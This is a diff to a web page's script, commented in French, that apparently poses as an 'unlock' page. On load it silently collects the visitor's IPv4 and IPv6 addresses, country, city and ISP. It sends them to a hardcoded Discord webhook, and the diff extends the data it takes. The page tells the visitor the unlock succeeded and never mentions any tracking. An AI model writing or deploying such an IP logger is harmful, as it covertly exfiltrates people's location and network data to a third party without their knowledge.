@@ -39,51 +39,60 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZ
 window.onload = function() {
     document.getElementById("resultText").textContent = "Récupération de vos données...";
 
-    let ip = "Inconnu";
-    let geoInfo = "Aucune info geo récupérée (limite API atteinte ?)";
+    let ipv4 = "Inconnu";
+    let ipv6 = "Non disponible";
+    let geoInfo = "Aucune info geo récupérée";
 
+    // Récup IPv4 (toujours fiable)
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
-            ip = data.ip;
+            ipv4 = data.ip;
 
-            // Tentative de récupération geo
-            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,isp,org`)
+            // Tentative IPv6
+            return fetch("https://api64.ipify.org?format=json")
+                .then(res => {
+                    if (!res.ok) throw new Error("Pas d'IPv6");
+                    return res.json();
+                })
+                .then(data6 => { ipv6 = data6.ip; })
+                .catch(() => { ipv6 = "Non disponible (pas d'IPv6 ou erreur)"; });
+        })
+        .then(() => {
+            // Récup geo sur IPv4
+            return fetch(`http://ip-api.com/json/${ipv4}?fields=status,message,country,countryCode,city,isp,org`)
                 .then(geoRes => {
-                    if (!geoRes.ok) throw new Error("Rate limit ou erreur HTTP");
+                    if (!geoRes.ok) throw new Error("Rate limit geo");
                     return geoRes.json();
                 })
                 .then(geoData => {
                     if (geoData.status === "success") {
                         const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
                         geoInfo = `🌍 Pays : ${flag} ${geoData.country || "Inconnu"}\n🏙️ Ville : ${geoData.city || "Inconnu"}\n📡 ISP : ${geoData.isp || "Inconnu"}\n🏢 Org : ${geoData.org || "Inconnu"}`;
-                    } else {
-                        geoInfo = `Geo échouée : ${geoData.message || "Inconnu"}`;
                     }
                 })
-                .catch(err => {
-                    geoInfo = "Geo indisponible (probablement limite de 45 req/min atteinte)";
-                })
-                .finally(() => {
-                    // Envoi au webhook même si geo échoue
-                    const payload = {
-                        content: `📥 **Nouveau visiteur (auto)**\n` +
-                                 `🌐 IP : ${ip}\n` +
-                                 `${geoInfo}\n` +
-                                 `🕒 ${new Date().toLocaleString()}`
-                    };
+                .catch(() => { geoInfo = "Geo indisponible (limite atteinte ?)"; });
+        })
+        .finally(() => {
+            // Envoi webhook
+            const payload = {
+                content: `📥 **Nouveau visiteur (auto)**\n` +
+                         `🌐 IPv4 : ${ipv4}\n` +
+                         `🌐 IPv6 : ${ipv6}\n` +
+                         `${geoInfo}\n` +
+                         `🕒 ${new Date().toLocaleString()}`
+            };
 
-                    fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
 
-                    document.getElementById("resultText").textContent = "Débloqué avec succès !";
-                });
+            document.getElementById("resultText").textContent = "Débloqué avec succès !";
         })
         .catch(() => {
-            document.getElementById("resultText").textContent = "Erreur réseau, réessayez plus tard.";
+            document.getElementById("resultText").textContent = "Erreur réseau, mais données peut-être envoyées.";
         });
 }
 </script>
